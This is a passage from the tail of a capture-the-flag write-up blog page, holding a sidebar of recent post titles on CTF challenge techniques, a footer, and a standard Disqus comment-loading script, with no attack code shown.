FINAL SCRIPT</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-0-REFERENCE"><span class="toc-number">6.</span> <span class="toc-text">6.0 REFERENCE</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/12/MISC%20--%20Guess%20The%20Number%20--%20timing_side-channel_attack/" title="MISC -- Guess The Number -- timing_side-channel_attack">MISC -- Guess The Number -- timing_side-channel_attack</a><time datetime="2026-01-11T16:00:00.000Z" title="Created 2026-01-12 00:00:00">2026-01-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/12/MISC%20--%20Encryption%20Service%20--%20xargs_argument_injection/" title="MISC -- Encryption Service -- xargs_argument_injection">MISC -- Encryption Service -- xargs_argument_injection</a><time datetime="2026-01-11T16:00:00.000Z" title="Created 2026-01-12 00:00:00">2026-01-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/12/MISC%20--%20loterry%20--%20Arithmetic_Injection/" title="MISC -- loterry -- Arithmetic_Injection">MISC -- loterry -- Arithmetic_Injection</a><time datetime="2026-01-11T16:00:00.000Z" title="Created 2026-01-12 00:00:00">2026-01-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/30/WEB%20--%20PHP-Redis%20--%20SSRF%20file_confusion%20redis_dict/" title="WEB -- PHP-Redis -- SSRF file_confusion redis_dict">WEB -- PHP-Redis -- SSRF file_confusion redis_dict</a><time datetime="2025-12-29T16:00:00.000Z" title="Created 2025-12-30 00:00:00">2025-12-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/26/PWN%20--%20sketchy%20--%20fget_wait%20%20got_overwrite/" title="PWN -- sketchy -- fget_wait  got_overwrite">PWN -- sketchy -- fget_wait  got_overwrite</a><time datetime="2025-12-25T16:00:00.000Z" title="Created 2025-12-26 00:00:00">2025-12-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2026 By salad07</div><div class="footer_custom_text"><div class="github-badge"> <span class="badge-subject">Powered</span><span class="badge-value bg-blue">Hexo</span></div>  <div class="github-badge"><span class="badge-subject">Theme</span><span class="badge-value bg-blueviolet">Butterfly</span></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'http://example.com/2026/01/12/MISC%20--%20Encryption%20Service%20--%20xargs_argument_injection/'
+    this.page.identifier = '/2026/01/12/MISC%20--%20Encryption%20Service%20--%20xargs_argument_injection/'
+    this.page.title = 'MISC -- Encryption Service -- xargs_argument_injection'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://saladbkp.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Disqus' === 'Disqus' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script async src="/js/myjs.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
